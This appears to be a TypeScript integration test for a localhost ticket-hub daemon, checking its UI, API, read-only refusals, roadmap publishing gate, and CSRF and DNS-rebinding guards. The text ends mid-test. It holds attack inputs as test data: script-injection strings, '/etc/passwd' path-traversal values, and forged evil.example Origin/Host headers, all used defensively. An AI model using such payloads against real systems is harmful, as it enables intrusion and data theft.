// DL-1 — the read-only localhost daemon over the hub SoR. Seeds a project with tickets + a published
// roadmap through the REAL MCP write path (distinct actors), then starts the daemon in-process against
// the same WAL db and asserts every read endpoint, the 404s, the read-only 405, and the 127.0.0.1 bind.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { rmSync, mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { execFileSync } from "node:child_process";
import { once } from "node:events";
import { request as httpRequest } from "node:http";
import { openDb } from "../src/db.ts";
import { findProject } from "../src/seed.ts";
import { createDaemon, roadmapDivergenceDoc } from "../src/daemon.ts";
import { ticketPage, boardPage } from "../src/daemonviews.ts"; // DL-86: unit-check the failed-write re-render input preservation

const DB = "/tmp/hub-daemon/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch {} }

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// seed the project + actors (ensureActors runs inside seed.ts)
execFileSync("node", ["src/seed.ts", "dmn", "Daemon Project", "DMN", DB], { encoding: "utf8" });

// ─── seed data through the real MCP write path (the daemon must read what agents wrote) ───
async function as(actor: string): Promise<Client> {
  const c = new Client({ name: `dtest-${actor}`, version: "0.0.0" });
  await c.connect(new StdioClientTransport({
    command: "node", args: ["src/server.ts"],
    env: { ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: "dmn", DEVLOOP_HUB_DB: DB },
  }));
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown>): Promise<any> {
  const r: any = await c.callTool({ name, arguments: args });
  const text = r.content?.[0]?.text ?? "{}";
  if (r.isError) throw new Error(`${name} failed: ${text}`);
  return JSON.parse(text);
}

const pm = await as("pm"), op = await as("operator");
const feat = await call(pm, "save_issue", { title: "Daemon foundation", type: "Feature", labels: ["dev-loop", "Feature", "pm"], priority: 2, description: "# Foundation\n- item one\n- [ ] todo box\n**bold** & <script>alert(1)</script>" }); // DL-16: markdown + an XSS-injection
const bug = await call(pm, "save_issue", { title: "A defect to fix", type: "Bug", labels: ["dev-loop", "Bug", "qa"], priority: 1 });
await call(pm, "save_comment", { issueId: feat.id, body: "kicking this off — **go** <script>x()</script>" }); // DL-16: comment markdown + an XSS-injection
await call(pm, "save_issue", { id: bug.id, state: "In Review", relatedTo: [feat.id] }); // give the board >1 state + a relation (DL-8)
await call(pm, "save_issue", { id: bug.id, state: "Done" }); // DL-17: a Done transition → exercises the activity throughput + cycle-time paths
// a published roadmap doc (operator-only publish gate)
await call(op, "doc.save", { slug: "roadmap", kind: "roadmap", title: "Product Roadmap", body: "# Roadmap\n- DL-1 daemon foundation\n", baseVersion: 0 });
await call(op, "doc.publish", { kind: "roadmap", version: 1 });
for (const c of [pm, op]) await c.close();

// ─── start the daemon in-process, read-only, on an ephemeral localhost port ───
const ddb = openDb(DB);
ddb.exec("PRAGMA query_only=ON");
const projectId = findProject(ddb, "dmn")!;
const server = createDaemon({ db: ddb, projectId, projectKey: "dmn" });
server.listen(0, "127.0.0.1");
await once(server, "listening");
const addr = server.address() as { address: string; port: number };
const base = `http://127.0.0.1:${addr.port}`;
ok(addr.address === "127.0.0.1", "daemon binds 127.0.0.1 ONLY (localhost, never 0.0.0.0) — §16");

async function get(path: string, method = "GET"): Promise<{ status: number; body: any }> {
  const r = await fetch(base + path, { method });
  let body: any; try { body = await r.json(); } catch { body = null; }
  return { status: r.status, body };
}

async function getHtml(path: string): Promise<{ status: number; type: string; text: string }> {
  const r = await fetch(base + path);
  return { status: r.status, type: r.headers.get("content-type") ?? "", text: await r.text() };
}

// ─── DL-2: the server-rendered web UI (board at /, ticket detail at /ticket/:id) ───
// GET / — the board UI renders the seeded tickets grouped into state columns
const board = await getHtml("/");
ok(board.status === 200 && board.type.includes("text/html"), "GET / → 200 text/html (web UI board)");
ok(board.text.includes("<!doctype html") && board.text.includes('class="board"'), "board page is an HTML doc with the board container");
ok(board.text.includes(feat.id) && board.text.includes("Daemon foundation"), "board renders the seeded Feature card (id + title)");
ok(board.text.includes(bug.id) && board.text.includes("A defect to fix"), "board renders the seeded Bug card (id + title)");
ok(board.text.includes(">Todo<") && board.text.includes(">In Review<"), "board shows state columns (Todo + In Review)");
ok(board.text.includes(`/ticket/${feat.id}`), "board cards link to the ticket detail route");

// ─── DL-20: web-UI board server-side filter/search (mirrors /api/tickets) ───
// the seed: feat = Feature/Todo/pm "Daemon foundation"; bug = Bug/Done/qa "A defect to fix"
const fCard = `/ticket/${feat.id}`, bCard = `/ticket/${bug.id}`;
ok(board.text.includes(fCard) && board.text.includes(bCard), "DL-20: unfiltered GET / shows ALL cards (baseline, unchanged)");
const byType = await getHtml("/?type=Bug");
ok(byType.text.includes(bCard) && !byType.text.includes(fCard), "DL-20 AC1: GET /?type=Bug → only the Bug card");
const byState = await getHtml("/?state=Todo");
ok(byState.text.includes(fCard) && !byState.text.includes(bCard), "DL-20 AC1: GET /?state=Todo → only the Todo card (feat)");
const byLabel = await getHtml("/?label=qa");
ok(byLabel.text.includes(bCard) && !byLabel.text.includes(fCard), "DL-20 AC1: GET /?label=qa → only the qa-owned card (bug)");
const byQTitle = await getHtml("/?q=DEFECT");        // bug title "A defect to fix" — case-insensitive
ok(byQTitle.text.includes(bCard) && !byQTitle.text.includes(fCard), "DL-20 AC2: free-text ?q= matches title case-insensitively (→ bug)");
const byQId = await getHtml(`/?q=${feat.id.toLowerCase()}`);
ok(byQId.text.includes(fCard) && !byQId.text.includes(bCard), "DL-20 AC2: ?q= matches ticket id case-insensitively (→ feat)");
ok(byState.text.includes("clear all") && byState.text.includes("state: Todo"), "DL-20 AC3: active filters render a clearable control row (chip + clear-all)");
ok(byState.text.includes('name="state" value="Todo"') && byState.text.includes('name="q"'), "DL-20 AC3: the active filter is preserved in the search form (a q-search keeps it) — deep-linkable via the URL");
const noMatch = await getHtml("/?state=Backlog");    // nothing is in Backlog
ok(!noMatch.text.includes(fCard) && !noMatch.text.includes(bCard) && noMatch.text.includes("No tickets match"), "DL-20 AC3: a no-match filter → empty state, no cards");
ok(byQTitle.text.includes('class="board"'), "DL-20 AC4/AC1: a filtered board still renders the state columns (only matching cards), no client JS");

// GET /ticket/:id — the detail UI shows the full description + comments
const view = await getHtml(`/ticket/${feat.id}`);
ok(view.status === 200 && view.type.includes("text/html"), "GET /ticket/:id → 200 text/html (detail view)");
ok(view.text.includes("Daemon foundation") && view.text.includes("kicking this off"), "detail view shows the title/description and the attributed pm comment");
const ghost = await getHtml("/ticket/DMN-999");
ok(ghost.status === 404 && ghost.type.includes("text/html"), "GET /ticket/<unknown> → 404 HTML");

// DL-8 — the detail view surfaces relatedTo / duplicateOf as click-through links, ONLY when present
const relView = await getHtml(`/ticket/${bug.id}`);          // bug relatedTo=[feat.id]
ok(relView.text.includes("<dt>Related</dt>") && relView.text.includes(`href="/ticket/${feat.id}"`), "DL-8: a ticket with relatedTo → a Related row linking to /ticket/<id>");
const noRelView = await getHtml(`/ticket/${feat.id}`);       // feat has no relations
ok(!noRelView.text.includes("<dt>Related</dt>") && !noRelView.text.includes("Duplicate of"), "DL-8: a ticket with no relations → no Related/Duplicate row (no dangling labels)");

// DL-16 — ticket + comment bodies render via renderMarkdown (not raw <pre>); meta shows timestamps; XSS inert
ok(view.text.includes("<h1>Foundation</h1>") && view.text.includes("<li>item one</li>") && view.text.includes("<strong>bold</strong>"), "DL-16: the description renders markdown (heading/list/bold → HTML, not literal ##/**)");
ok(view.text.includes('<input type="checkbox" disabled> todo box'), "DL-16: a `- [ ]` item renders a disabled checkbox");
ok(view.text.includes("<strong>go</strong>"), "DL-16: comment bodies render markdown too (consistent with the description)");
ok(view.text.includes("<dt>Created</dt>") && view.text.includes("<dt>Updated</dt>"), "DL-16: the detail meta shows created + updated timestamps");
ok(view.text.includes("&lt;script&gt;alert(1)") && !view.text.includes("<script>alert(1)") && !view.text.includes("<script>x()"), "DL-16/XSS: an injected <script> in the description AND the comment is escaped/inert (renderMarkdown esc-first)");

// ─── DL-17: read-only activity & throughput view over the events ledger ───
const act = await getHtml("/activity");
ok(act.status === 200 && act.type.includes("text/html"), "DL-17: GET /activity → 200 text/html (activity view)");
ok(act.text.includes("<!doctype html") && act.text.includes("<h1>Activity</h1>"), "DL-17: /activity is an HTML page titled Activity");
// AC1 — the recent-events feed shows the seeded create / transition(from→to) / comment events, newest-first
ok(act.text.includes(feat.id) && act.text.includes("created"), "DL-17 AC1: feed shows an issue.create event (ticket id + 'created')");
ok(act.text.includes("moved") && act.text.includes("→") && act.text.includes(">Done<"), "DL-17 AC1: feed shows an issue.transition with from→to (the In Review→Done move)");
ok(act.text.includes("commented on"), "DL-17 AC1: feed shows the comment.add event");
// AC2 — throughput: count of transitions into Done in a recent window (the bug reached Done during seeding)
ok(act.text.includes("Throughput") && act.text.includes("into Done"), "DL-17 AC2: a throughput section counts transitions into Done");
// DL-79 — the acceptance-rate section renders on the live page (precise rate/flag/empty-state cases: test/accept-rate.ts)
ok(act.text.includes("Acceptance rate"), "DL-79: an acceptance-rate section renders on the live /activity page");
// AC3 — per-actor activity counts over the window (pm did every seed write)
ok(act.text.includes("Per-actor activity") && act.text.includes(">pm<"), "DL-17 AC3: per-actor activity lists the actor (pm)");
// AC4 — cycle time per recently-Done ticket (the bug: create → Done)
ok(act.text.includes("Cycle time") && act.text.includes(bug.id), "DL-17 AC4: cycle-time section lists the recently-Done ticket");
// AC1/AC6 — the header nav links to /activity (rendered on every page, e.g. the board)
ok(board.text.includes('href="/activity"'), "DL-17 AC1/AC6: the header nav links to /activity");
// AC7 — non-GET is refused 405 (read-only), consistent with the other read routes
ok((await get("/activity", "POST")).status === 405, "DL-17 AC7: POST /activity → 405 (read-only daemon)");

// GET /api — the JSON API index (moved off / when DL-2 took the root for the UI)
const root = await get("/api");
ok(root.status === 200 && root.body.project === "dmn" && root.body.endpoints.includes("/api/tickets") && root.body.ui === "/", "GET /api → 200 JSON index naming the project, endpoints, and the UI root");

// GET /api/health
const health = await get("/api/health");
ok(health.status === 200 && health.body.ok === true && health.body.project === "dmn", "GET /api/health → ok:true for the project");

// ── DL-41: /api/health is a REAL DB-writable liveness check, NOT a static {ok:true} — a bound-but-wedged
// daemon (write connection dead → SoR unwritable) reads NOT healthy (503), so the lifecycle up/status
// recover it instead of no-op'ing onto a dead process. Uses a throwaway writable daemon we then wedge.
const hwrite = openDb(DB);
const hread = openDb(DB); hread.exec("PRAGMA query_only=ON");
const hsrv = createDaemon({ db: hread, projectId, projectKey: "dmn", writeDb: hwrite, actor: "operator" });
hsrv.listen(0, "127.0.0.1"); await once(hsrv, "listening");
const hbase = `http://127.0.0.1:${(hsrv.address() as { port: number }).port}`;
const hLive = await fetch(hbase + "/api/health"); const hLiveBody = await hLive.json();
ok(hLive.status === 200 && hLiveBody.ok === true, "DL-41: /api/health → 200 ok:true while the SoR is writable (a real read+write probe, not a static 200)");
hwrite.close();                       // simulate a bound-but-wedged daemon: its write connection is dead
const hWedged = await fetch(hbase + "/api/health"); const hWedgedBody = await hWedged.json().catch(() => ({}));
ok(hWedged.status === 503 && hWedgedBody.ok === false, "DL-41: a wedged (unwritable) SoR → /api/health 503 ok:false (lifecycle then reclaims it)");
hsrv.close(); hread.close();

// GET /api/tickets — full board
const all = await get("/api/tickets");
const featCard = all.body.find((t: any) => t.id === feat.id);
ok(all.status === 200 && all.body.length === 2, `GET /api/tickets → both tickets (got ${all.body.length})`);
ok(featCard && featCard.type === "Feature" && featCard.state === "Todo" && featCard.priority === 2 && featCard.labels.includes("pm"), "ticket card carries id/title/type/state/owner/priority (parsed labels)");

// GET /api/tickets?state= / ?type= — filters
const todos = await get("/api/tickets?state=Todo");
ok(todos.status === 200 && todos.body.length === 1 && todos.body[0].id === feat.id, "GET /api/tickets?state=Todo → only the Todo card");
const bugs = await get("/api/tickets?type=Bug");
ok(bugs.status === 200 && bugs.body.length === 1 && bugs.body[0].id === bug.id, "GET /api/tickets?type=Bug → only the Bug card");
const owned = await get("/api/tickets?label=pm");
ok(owned.body.length === 1 && owned.body[0].id === feat.id, "GET /api/tickets?label=pm → only the pm-owned card");

// GET /api/tickets/:id — detail + comments
const detail = await get(`/api/tickets/${feat.id}`);
ok(detail.status === 200 && detail.body.id === feat.id && Array.isArray(detail.body.comments) && detail.body.comments.some((c: any) => c.author === "pm"), "GET /api/tickets/:id → detail with the pm comment (attributed)");
const missing = await get("/api/tickets/DMN-999");
ok(missing.status === 404, "GET /api/tickets/<unknown> → 404");

// ─── DL-36: an unknown NON-API path → friendly HTML 404; an unknown /api/* path → JSON 404 (unchanged) ───
const htmlMiss = await getHtml("/totally/bogus");
ok(htmlMiss.status === 404 && htmlMiss.type.includes("text/html") && htmlMiss.text.includes("No page") && htmlMiss.text.includes("/totally/bogus"), "DL-36: unknown non-API path → 404 text/html friendly page (not a raw-JSON dead-end)");
const apiMiss = await get("/api/totally/bogus");
ok(apiMiss.status === 404 && !!apiMiss.body?.error, "DL-36: unknown /api/* path → 404 application/json (machine path unchanged)");

// GET /api/docs + /api/docs/:kind — the roadmap document
const docs = await get("/api/docs");
ok(docs.status === 200 && docs.body.some((d: any) => d.kind === "roadmap" && d.status === "current"), "GET /api/docs → lists the published roadmap");
const roadmap = await get("/api/docs/roadmap");
ok(roadmap.status === 200 && roadmap.body.status === "current" && roadmap.body.current_version === 1 && roadmap.body.body.includes("# Roadmap"), "GET /api/docs/roadmap → the current published body");
const noDoc = await get("/api/docs/strategy");
ok(noDoc.status === 404, "GET /api/docs/<absent kind> → 404");

// ─── DL-7: a malformed percent-escape in a path segment is a CLIENT error (400), never a 500 ───
// decodeURIComponent throws URIError on "%", "%ZZ", or an incomplete UTF-8 escape "%E0%A4"; each
// route must surface 400 instead of letting it fall through to the generic 500 catch. Covers the
// web route (/ticket/:id) AND both /api routes (/api/tickets/:id, /api/docs/:kind).
for (const p of ["/ticket/%", "/ticket/%ZZ", "/ticket/%E0%A4", "/api/tickets/%", "/api/docs/%"]) {
  const bad = await get(p);
  ok(bad.status === 400, `GET ${p} (malformed percent-escape) → 400, not 500 (got ${bad.status})`);
}
// the daemon stays alive and serves a normal request after a malformed one (no crash)
const afterBad = await get("/api/health");
ok(afterBad.status === 200 && afterBad.body.ok === true, "daemon serves normally after a malformed-escape request");

// READ-ONLY: any mutating method is refused
const post = await get("/api/tickets", "POST");
ok(post.status === 405, "POST /api/tickets → 405 (read-only daemon — no mutation surface)");
const del = await get(`/api/tickets/${feat.id}`, "DELETE");
ok(del.status === 405, "DELETE /api/tickets/:id → 405 (read-only)");

// ─── DL-3: roadmap view/edit write surface — markdown render, CAS, operator-publish gate, §17 firewall ───
// Writable daemons take a SEPARATE writable connection + an actor; the read connection stays query_only.
// One runs as the OPERATOR (may publish), one as a NON-operator (drafts only).
async function startWritable(actor: string, roadmapRepoFileStrategy?: string): Promise<{ base: string; close: () => void }> {
  const wdb = openDb(DB);                                   // writable — backs ONLY the /roadmap/* routes
  const rdb = openDb(DB); rdb.exec("PRAGMA query_only=ON");
  const srv = createDaemon({ db: rdb, projectId, projectKey: "dmn", writeDb: wdb, actor, roadmapRepoFileStrategy });
  srv.listen(0, "127.0.0.1"); await once(srv, "listening");
  const p = (srv.address() as { port: number }).port;
  return { base: `http://127.0.0.1:${p}`, close: () => { srv.close(); rdb.close(); wdb.close(); } };
}
async function postForm(b: string, path: string, fields: Record<string, string>): Promise<{ status: number; location: string | null; text: string }> {
  const r = await fetch(b + path, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(fields).toString(), redirect: "manual" });
  return { status: r.status, location: r.headers.get("location"), text: await r.text() };
}
const gettext = async (b: string, path: string) => { const r = await fetch(b + path); return { status: r.status, text: await r.text() }; };

const opd = await startWritable("operator");
const devd = await startWritable("dev");          // a non-operator actor
const verifier = await as("pm");                  // an MCP client to inspect doc state precisely

// AC1 — GET /roadmap renders the current roadmap doc (markdown) + version/status, + the edit/publish controls.
const rm = await gettext(opd.base, "/roadmap");
ok(rm.status === 200 && rm.text.includes("<li>DL-1 daemon foundation</li>"), "GET /roadmap → 200 with the roadmap body RENDERED from markdown (- item → <li>)");
ok(rm.text.includes("Published (v1)"), "roadmap view shows the version/status (published v1)");
ok(rm.text.includes('action="/roadmap/save"'), "roadmap shows the edit form (draft-save)");
ok(rm.text.includes('action="/roadmap/publish"'), "operator daemon shows the publish control");

// AC2 — edit saves a DRAFT via the CAS; it does NOT publish (published current stays v1).
const save = await postForm(opd.base, "/roadmap/save", { baseVersion: "1", body: "# Roadmap\n- DL-1 daemon foundation\n- DL-2 web UI\n", summary: "add DL-2" });
ok(save.status === 303 && save.location === "/roadmap", "POST /roadmap/save → 303 redirect (Post/Redirect/Get)");
ok((await get("/api/docs/roadmap")).body.current_version === 1, "after save, the PUBLISHED current is still v1 (a draft never auto-publishes)");
const rm2 = await gettext(opd.base, "/roadmap");
ok(rm2.text.includes("Draft (v2, unpublished)") && rm2.text.includes("<li>DL-2 web UI</li>"), "roadmap now shows the v2 DRAFT (unpublished) with the new content");

// AC2 — optimistic CAS: a stale baseVersion is surfaced as a CONFLICT (409), never last-write-wins.
const stale = await postForm(opd.base, "/roadmap/save", { baseVersion: "1", body: "STALE OVERWRITE — keep my edit", summary: "racing" });
ok(stale.status === 409 && /CONFLICT/.test(stale.text), "stale baseVersion → 409 CONFLICT (no last-write-wins)");
// DL-14: the rejected re-render keeps the user's typed text (not the DB body) + refreshes baseVersion to the current latest (2)
ok(stale.text.includes("STALE OVERWRITE — keep my edit") && stale.text.includes('name="body"'), "DL-14: a rejected save preserves the submitted text in the textarea (not reverted to the DB body)");
ok(stale.text.includes('name="baseVersion" value="2"'), "DL-14: the rejected re-render refreshes baseVersion to the current latest, so an immediate re-submit targets the right base");
ok((await call(verifier, "doc.history", { kind: "roadmap" })).length === 2, "the rejected stale save created NO new version — still exactly 2 (v1 published + v2 draft)");

// AC3 — only the OPERATOR may publish; a non-operator daemon must not (UI hides it AND the endpoint 403s).
const devView = await gettext(devd.base, "/roadmap");
ok(!devView.text.includes('action="/roadmap/publish"') && devView.text.includes('action="/roadmap/save"'), "non-operator UI hides publish, still offers draft-save");
const devPub = await postForm(devd.base, "/roadmap/publish", { version: "2" });
ok(devPub.status === 403 && /FORBIDDEN/.test(devPub.text), "non-operator POST /roadmap/publish → 403 FORBIDDEN (operator-publish gate)");
ok((await call(verifier, "doc.get", { kind: "roadmap" })).current_version === 1, "after the forbidden publish attempt, published current is STILL v1");

// AC3 — the operator CAN publish the v2 draft → current.
const opPub = await postForm(opd.base, "/roadmap/publish", { version: "2" });
ok(opPub.status === 303 && opPub.location === "/roadmap", "operator POST /roadmap/publish → 303 (published)");
const nowPub = await call(verifier, "doc.get", { kind: "roadmap" });
ok(nowPub.current_version === 2 && nowPub.version === 2, "operator publish moved the live roadmap → v2");

// AC4 — §17 firewall: the write path is DB-doc-only and ALWAYS targets kind:"roadmap". Caller form input
// (a crafted slug/kind/path) cannot redirect the write off the roadmap doc or to a filesystem path —
// the daemon never reads those fields; the write goes through docstore (no fs API in the write path).
const inject = await postForm(opd.base, "/roadmap/save", { baseVersion: "2", body: "firewall probe", slug: "../../etc/passwd", kind: "strategy", path: "/etc/passwd" });
ok(inject.status === 303, "save with injected slug/kind/path fields → still 303 (the extra fields are ignored)");
const docsAfter = await call(verifier, "doc.list", {});
ok(docsAfter.length === 1 && docsAfter.every((d: any) => d.kind === "roadmap"), "no stray doc created — every write targeted kind:'roadmap' (slug/kind/path injection ignored; §17 firewall)");
ok((await call(verifier, "doc.history", { kind: "roadmap" })).length === 3, "the injected save appended to the roadmap doc (v3), proving the target was never redirected");

// a non-roadmap mutating route is still refused on the writable daemon (only /roadmap/* writes)
ok((await postForm(opd.base, "/api/tickets", {})).status === 405, "POST to a non-roadmap route on the writable daemon → 405 (only /roadmap/* writes)");

// DL-3 hardening (adversarial review): an over-limit POST body must NOT hang the handler —
// parseFormBody always settles (over-limit → reject), so the request returns fast instead of dangling.
let settled = false;
await Promise.race([
  postForm(opd.base, "/roadmap/save", { body: "x".repeat(1_100_000) }).then(() => { settled = true; }, () => { settled = true; }),
  new Promise((r) => setTimeout(r, 3000)),
]);
ok(settled, "an over-limit (>1MB) POST body settles fast (no hang) — the handler never dangles");

// ── DL-83: north-star divergence banner on /roadmap (a repo-file strategyDoc ⇒ NO agent reads the hub roadmap) ──
// Detection half (AC1/AC3) — the pure config→flag rule. Banner shows ONLY for a repo-file strategyDoc with no
// agent reading the hub roadmap (hub.docs:false/absent AND no director); a hub-doc / director project ⇒ none.
ok(roadmapDivergenceDoc({ hub: { docs: false }, strategyDoc: "docs/STRATEGY.md" }) === "docs/STRATEGY.md",
   "DL-83 detect: repo-file strategy (hub.docs:false, no director) → the strategyDoc path (banner)");
ok(roadmapDivergenceDoc({ strategyDoc: "docs/STRATEGY.md" }) === "docs/STRATEGY.md",
   "DL-83 detect: hub.docs ABSENT (+ no director) → still a repo-file strategy → the path");
ok(roadmapDivergenceDoc({ hub: { docs: true }, strategyDoc: "docs/STRATEGY.md" }) === undefined,
   "DL-83 detect: hub.docs:true → the hub doc IS the north-star → no banner");
ok(roadmapDivergenceDoc({ director: { channel: {} }, strategyDoc: "docs/STRATEGY.md" }) === undefined,
   "DL-83 detect: a director config present → the hub roadmap is the north-star → no banner");
ok(roadmapDivergenceDoc({ strategyDoc: { linearDocument: "x" } }) === undefined && roadmapDivergenceDoc(undefined) === undefined,
   "DL-83 detect: a non-repo-file (linear/hub-doc object) strategyDoc, or unknown config → no banner");

// Rendering half (AC5 + AC2 + AC4) — a daemon told the strategy is a repo file renders the neutral banner
// (naming the esc'd path) WITHOUT hiding the edit control; a daemon with no flag (hub-doc/director) omits it.
const BANNER = "not read by the agents";
const rfs = await startWritable("operator", "docs/STRATEGY.md");
const rfsView = await gettext(rfs.base, "/roadmap");
ok(rfsView.text.includes(BANNER) && rfsView.text.includes("docs/STRATEGY.md") && rfsView.text.includes('class="notice n-info"'),
   "DL-83: repo-file-strategy daemon → /roadmap shows the neutral divergence banner (n-info, not n-err) naming the strategyDoc");
ok(rfsView.text.includes('action="/roadmap/save"'),
   "DL-83: the banner is informational — it does NOT hide the existing edit control (AC2)");
const xss = await startWritable("operator", "docs/<script>.md");
ok((await gettext(xss.base, "/roadmap")).text.includes("docs/&lt;script&gt;.md"),
   "DL-83: the strategyDoc path is esc'd in the banner (AC4 — XSS parity)");
const noBanner = await gettext(opd.base, "/roadmap");   // opd was created WITHOUT roadmapRepoFileStrategy
// Discriminate on the rendered banner ELEMENT (`class="notice n-info"`), NOT the bare "n-info" substring —
// the `.n-info` CSS rule is in every page's <style>, so a substring check would false-positive here.
ok(!noBanner.text.includes(BANNER) && !noBanner.text.includes('class="notice n-info"'),
   "DL-83: hub-roadmap-is-north-star daemon (no flag) → NO divergence banner (AC3 byte-for-byte unchanged)");
rfs.close(); xss.close();

// ── DL-19: CSRF (cross-origin) + DNS-rebinding (foreign Host) guard on the write routes ───────────
// fetch() forbids setting Origin/Host (browser-forbidden header names), so use a raw node:http request
// to forge them. Connects to 127.0.0.1:<port> but sends whatever Origin/Host headers we choose.
function rawPost(port: number, path: string, extraHeaders: Record<string, string>, body: string): Promise<{ status: number; text: string }> {
  return new Promise((resolve, reject) => {
    const r = httpRequest({ hostname: "127.0.0.1", port, method: "POST", path,
      headers: { "content-type": "application/x-www-form-urlencoded", "content-length": Buffer.byteLength(body), ...extraHeaders } },
      (res) => { let d = ""; res.setEncoding("utf8"); res.on("data", (c) => (d += c)); res.on("end", () => resolve({ status: res.statusCode ?? 0, text: d })); });
    r.on("error", reject); r.end(body);
  });
}
const opPort = Number(new URL(opd.base).port);
const baseV = (await call(verifier, "doc.history", { kind: "roadmap" })).length;          // current latest version (= count); a valid CAS base, so a block (not a conflict) is what stops the write
const form19 = (b: string) => new URLSearchParams({ baseVersion: String(baseV), body: b, summary: "dl19" }).toString();

// (a) a foreign Origin (valid local Host) → 403 CSRF refusal, no roadmap mutation
const csrfO = await rawPost(opPort, "/roadmap/save", { origin: "http://evil.example" }, form19("CSRF via a foreign Origin"));
ok(csrfO.status === 403, `DL-19 AC1: POST /roadmap/save with a foreign Origin → 403 (got ${csrfO.status})`);
// (b) a foreign Host (DNS-rebinding) → 403 refusal before any write
const rebind = await rawPost(opPort, "/roadmap/save", { host: "evil.example" }, form19("DNS rebinding via a foreign Host"));
ok(rebind.status === 403, `DL-19 AC2: POST /roadmap/save with a foreign Host → 403 (got ${rebind.status})`);
// AC4 — neither rejected write changed the document (no docSave ran): version count unchanged
ok((await call(verifier, "doc.history", { kind: "roadmap" })).length === baseV, "DL-19 AC4: the rejected CSRF + rebinding writes created NO new version (no mutation)");
// (c) AC3 — a legit SAME-origin browser submit (matching Origin + Host) still saves end-to-end
const sameO = await rawPost(opPort, "/roadmap/save", { origin: `http://127.0.0.1:${opPort}`, host: `127.0.0.1:${opPort}` }, form19("same-origin save still works"));
ok(sameO.status === 303, `DL-19 AC3: a same-origin submit (matching Origin/Host) still saves → 303 (got ${sameO.status})`);
ok((await call(verifier, "doc.history", { kind: "roadmap" })).length === baseV + 1, "DL-19 AC3: the same-origin save DID create a new draft (the guard allows legitimate writes)");

// ── DL-10: agent reports view (read-only filesystem source) — seed a temp §22 reports tree ───────
const RROOT = "/tmp/hub-reports/reports";
try { rmSync("/tmp/hub-reports", { recursive: true }); } catch {}
mkdirSync(join(RROOT, "dev-agent", "daily"), { recursive: true });
mkdirSync(join(RROOT, "dev-agent", "weekly"), { recursive: true });
mkdirSync(join(RROOT, "pm-agent", "daily"), { recursive: true });
writeFileSync(join(RROOT, "dev-agent", "daily", "2026-06-23.md"), "# Dev daily 2026-06-23\n- shipped DL-10\n");
writeFileSync(join(RROOT, "dev-agent", "daily", "2026-06-22.md"), "# Dev daily 2026-06-22\n");
writeFileSync(join(RROOT, "dev-agent", "daily", "2026-06-23.md.review.md"), "operator 点评: nice\n"); // must be EXCLUDED
writeFileSync(join(RROOT, "dev-agent", "weekly", "2026-W26.md"), "# Dev weekly\n");
writeFileSync(join(RROOT, "pm-agent", "daily", "2026-06-23.md"), "# PM daily\n");
process.env.DEVLOOP_REPORTS_DIR = RROOT;

// AC1 — /reports lists agents + their dated reports (most-recent first), weekly included, review-sibling excluded
const repIdx = await getHtml("/reports");
ok(repIdx.status === 200 && repIdx.type.includes("text/html"), "GET /reports → 200 HTML (reports index)");
ok(repIdx.text.includes("dev-agent") && repIdx.text.includes("pm-agent"), "reports index lists the agent dirs");
ok(repIdx.text.includes("2026-06-23") && repIdx.text.includes("2026-06-22") && repIdx.text.includes("2026-W26"), "lists daily + weekly dated reports");
ok(repIdx.text.indexOf("2026-06-23") < repIdx.text.indexOf("2026-06-22"), "dailies are most-recent-first");
ok(!repIdx.text.includes("点评"), "the *.review.md 点评 sibling is EXCLUDED from the listing (§22)");
ok(repIdx.text.includes('href="/reports/dev-agent/daily/2026-06-23"'), "each report links to its per-report route");

// AC2 — a selected report renders read-only (markdown rendered) with a back-link (no dead end)
const repView = await getHtml("/reports/dev-agent/daily/2026-06-23");
ok(repView.status === 200 && repView.text.includes("<li>shipped DL-10</li>") && repView.text.includes("← reports"), "GET /reports/<agent>/<level>/<date> → 200, renders markdown + a back-link");

// AC path-safety — traversal / garbage segments → 400 (not 500); valid-but-absent → 404
ok((await get("/reports/..%2f..%2f..%2fetc%2fpasswd/daily/2026-06-23")).status === 400, "a traversal agent segment → 400 (not 500)");
ok((await get("/reports/dev-agent/daily/..%2f..%2fsecret")).status === 400, "a traversal date segment → 400");
ok((await get("/reports/dev-agent/bogus/2026-06-23")).status === 400, "a bad level → 400");
ok((await get("/reports/dev-agent/daily/2026-1")).status === 400, "a non-grammar date → 400");
ok((await get("/reports/dev-agent/daily/2025-01-01")).status === 404, "a valid-grammar but absent report → 404");

// AC empty state — an absent reports tree shows a friendly empty page, not a 500
process.env.DEVLOOP_REPORTS_DIR = "/tmp/hub-reports-absent-xyz";
const repEmpty = await getHtml("/reports");
ok(repEmpty.status === 200 && repEmpty.text.includes("No reports found"), "an absent reports tree → friendly empty state (200, not 500)");
delete process.env.DEVLOOP_REPORTS_DIR;
try { rmSync("/tmp/hub-reports", { recursive: true }); } catch {}

// ── DL-29: opt-in human web-write routes (create/comment/move/assign) — gated by humanWrite.enabled,
// the same localhost CSRF/DNS-rebinding guard, attributed to the daemon actor (operator). Reuses `opd`
// (operator writable daemon); humanWrite is read FRESH per request so a live toggle takes effect. ───────
const setHumanWrite = (on: boolean) => { const s = openDb(DB); s.prepare("UPDATE projects SET settings_json=? WHERE id=?").run(JSON.stringify({ humanWrite: { enabled: on } }), projectId); s.close(); };

// AC1 — humanWrite DISABLED ⇒ POST is not a write route → falls through to 405 (byte-identical read-only).
ok((await postForm(opd.base, "/ticket", { title: "should 405" })).status === 405, "DL-29 AC1: POST /ticket with humanWrite DISABLED → 405 (byte-identical read-only)");
ok(!(await gettext(opd.base, "/")).text.includes('action="/ticket"'), "DL-29: board shows NO create form when humanWrite disabled");

setHumanWrite(true);
// AC1/AC3 — same-origin create (postForm sends no Origin ⇒ allowed) → 303 PRG; attributed to operator; reads back.
const created = await postForm(opd.base, "/ticket", { title: "Human-filed via board", type: "Bug" });
ok(created.status === 303 && /^\/ticket\/DMN-\d+$/.test(created.location ?? ""), `DL-29 AC1: POST /ticket (enabled, same-origin) → 303 to the new ticket (got ${created.status} ${created.location})`);
const nid = (created.location ?? "").split("/").pop()!;
const nt = (await get(`/api/tickets/${nid}`)).body;
